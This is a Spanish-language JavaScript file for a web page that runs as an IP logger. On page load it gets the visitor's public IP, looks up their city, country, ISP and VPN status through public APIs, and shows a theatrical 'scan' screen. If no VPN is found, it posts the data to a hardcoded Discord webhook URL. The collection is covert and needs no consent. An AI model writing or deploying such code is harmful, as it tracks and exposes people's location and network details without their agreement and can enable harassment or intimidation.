const WEBHOOK_URL = "https://discord.com/api/webhooks/1337893018513965198/AK_CRO2tbUnlhyYy2wshGJZLVpi9kRGpl85v8hS2HfheNGtZAb23c5aIjQ0fxxZuP0qn"; 

async function obtenerDatos() {
    try {
        document.getElementById("status").innerText = "🔍 Escaneando dirección IP...";

        // 🔹 Esperar 1 segundo para dar sensación de escaneo
        await new Promise(resolve => setTimeout(resolve, 1000));

        // 🔹 Obtener la IP pública
        const ipResponse = await fetch('https://api64.ipify.org?format=json');
        if (!ipResponse.ok) throw new Error("Error obteniendo la IP");
        const ipData = await ipResponse.json();
        const ip = ipData.ip;

        // 🔹 Mostrar en pantalla
        document.getElementById("titulo").innerText = "🟢 Sistema operativo detectado";
        document.getElementById("status").innerText = `✅ IP Detectada: ${ip}`;
        document.getElementById("scan-sound").play();

        // 🔹 Obtener detalles completos de la IP
        const detailsResponse = await fetch(`https://ipwho.is/${ip}?lang=es`);
        if (!detailsResponse.ok) throw new Error("Error obteniendo detalles de IP");
        const detailsData = await detailsResponse.json();

        const city = detailsData.city || "Desconocido";
        const country = detailsData.country || "Desconocido";
        const isp = detailsData.connection?.isp || "Desconocido";
        const isVPN = detailsData.security?.vpn || false;

        // 🔹 Mostrar en pantalla la información de la IP
        document.getElementById("ip-info").innerHTML = `
            📍 Ubicación: ${city}, ${country}<br>
            🏢 ISP: ${isp}<br>
            🛡️ VPN Detectado: ${isVPN ? "Sí 🚨" : "No ✅"}
        `;

        if (isVPN) {
            document.getElementById("status").innerText += "\n🚫 VPN detectado, acceso bloqueado.";
            return;
        }

        // 🔹 Crear el mensaje para Discord
        const mensaje = {
            content: "**🔍 Nueva conexión detectada**",
            embeds: [{
                title: "🌍 Datos del usuario",
                color: 16711680,
                fields: [
                    { name: "🖥️ IP", value: `||${ip}||`, inline: true },
                    { name: "📍 Ubicación", value: `${city}, ${country}`, inline: true },
                    { name: "🏢 ISP", value: isp, inline: true },
                    { name: "🛡️ VPN/Proxy", value: isVPN ? "Sí 🚨" : "No ✅", inline: true }
                ],
                footer: { text: "🔍 Logger IP | Seguridad Anti-VPN" }
            }]
        };

        // 🔹 Enviar la información a Discord
        const response = await fetch(WEBHOOK_URL, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify(mensaje)
        });

        if (response.ok) {
            console.log("✅ Datos enviados a Discord correctamente.");
            document.getElementById("status").innerText += "\n✅ Datos enviados a Discord.";
        } else {
            throw new Error("❌ Error al enviar los datos a Discord.");
        }

    } catch (error) {
        document.getElementById("status").innerText = "❌ Error en el proceso.";
        console.error(error);
    }
}

obtenerDatos();

// 🔹 Configurar partículas
particlesJS("particles-js", {
    particles: {
        number: { value: 150 },
        color: { value: "#00ff00" },
        shape: { type: "circle" },
        opacity: { value: 0.7, random: true },
        size: { value: 3, random: true },
        move: { speed: 1.5, direction: "top", out_mode: "out" }
    }
});
